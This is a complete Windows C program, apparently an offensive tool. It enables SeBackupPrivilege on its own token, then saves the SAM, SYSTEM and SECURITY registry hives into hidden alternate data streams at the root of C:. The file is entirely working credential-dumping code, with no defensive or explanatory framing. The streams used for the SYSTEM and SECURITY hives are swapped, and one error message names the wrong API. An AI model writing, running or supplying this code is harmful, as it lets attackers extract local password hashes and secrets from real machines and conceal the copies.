#include <windows.h>
#include <stdio.h>


#define ALTERNATE_DATA_STREAM_LOCATION_SAM "C:\\:SAM"
#define ALTERNATE_DATA_STREAM_LOCATION_SYSTEM "C:\\:SYSTEM"
#define ALTERNATE_DATA_STREAM_LOCATION_SECURITY "C:\\:SECURITY"

BOOL SaveKey(IN LPCSTR LocationStorage, IN LPCSTR RegKeyName)
{
    HKEY hKEY = NULL;
    LSTATUS STATUS;
    STATUS = RegOpenKeyExA(HKEY_LOCAL_MACHINE, RegKeyName, 0, KEY_READ, &hKEY);

    if (STATUS != ERROR_SUCCESS)
    {
        printf("[!] RegCreateKeyA failed with error code: 0x%08X\n", STATUS);
        return FALSE;
    }

    printf("[+] Opened handle to SAM key\n");

    STATUS = RegSaveKeyA(hKEY, LocationStorage, NULL);

    if (STATUS != ERROR_SUCCESS)
    {
        printf("[!] RegSaveKeyA failed with error code: 0x%08X\n", STATUS);
        RegCloseKey(hKEY);
        return FALSE;
    }
    RegCloseKey(hKEY);

    printf("[+] Saved %s contents... :)\n", RegKeyName);

    return TRUE;


}

BOOL EnablePriv()
{
    HANDLE hToken;
    LUID luidSeBackup;
    RtlSecureZeroMemory(&luidSeBackup, sizeof(LUID));

    if(!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_READ, &hToken))
    {
        printf("[!] OpenProcessToken failed with error code: %d\n", GetLastError());
        return FALSE;
    }
    
    DWORD RequiredBufferSize;

    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &RequiredBufferSize);

    TOKEN_PRIVILEGES* pTokenPrivs = (TOKEN_PRIVILEGES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RequiredBufferSize);

    if(!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, RequiredBufferSize, &RequiredBufferSize))
    {
        printf("[!] GetTokenInformation failed with error code: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);
        CloseHandle(hToken);
        return FALSE;
    }

    if(!LookupPrivilegeValueA(NULL, "SeBackupPrivilege", &luidSeBackup))
    {
        printf("[!] LookupPrivilegeValueA failed with error code: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);
        CloseHandle(hToken);
        return FALSE;
    }
    
    for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++)
    {
        if ((pTokenPrivs->Privileges[i].Luid.LowPart == luidSeBackup.LowPart) && (pTokenPrivs->Privileges[i].Luid.HighPart == luidSeBackup.HighPart))
        {
            pTokenPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
            printf("[i] SeBackupPrivilege found\n");
            break;
        }


    }

    if(!AdjustTokenPrivileges(hToken, FALSE, pTokenPrivs, 0, NULL, NULL))
    {
        printf("[!] AdjustTokenPrivileges failed with error code: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);
        CloseHandle(hToken);
        return FALSE;
    }


    printf("[+] Successfully updated privilege!\n");

    CloseHandle(hToken);
    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pTokenPrivs);

    return TRUE;

}

int main()
{
    // we first need to enable the SeBackupPrivilege privilege on our current token
    if(!EnablePriv())
    {
        printf("[!] SeBackupPrivilege was either not found or could not be enabled\n");
        printf("[!] Quitting...\n");
        return EXIT_FAILURE;
    }

    if (!SaveKey(ALTERNATE_DATA_STREAM_LOCATION_SAM, "SAM"))
    {
        printf("[!] Failed saving SAM key\n");
        return EXIT_FAILURE;
    }

    if(!SaveKey(ALTERNATE_DATA_STREAM_LOCATION_SECURITY, "SYSTEM"))
    {
        printf("[!] Failed saving SYSTEM key\n");
        return EXIT_FAILURE;
    }

    // will only work if is ran as SYSTEM
    if(!SaveKey(ALTERNATE_DATA_STREAM_LOCATION_SYSTEM, "SECURITY"))
    {
        printf("[!] Failed saving SECURITY key\n");
        printf("[!] Are you running as NT AUTHORITY\\SYSTEM?\n");
        return EXIT_FAILURE;

    }

    return EXIT_SUCCESS;
}
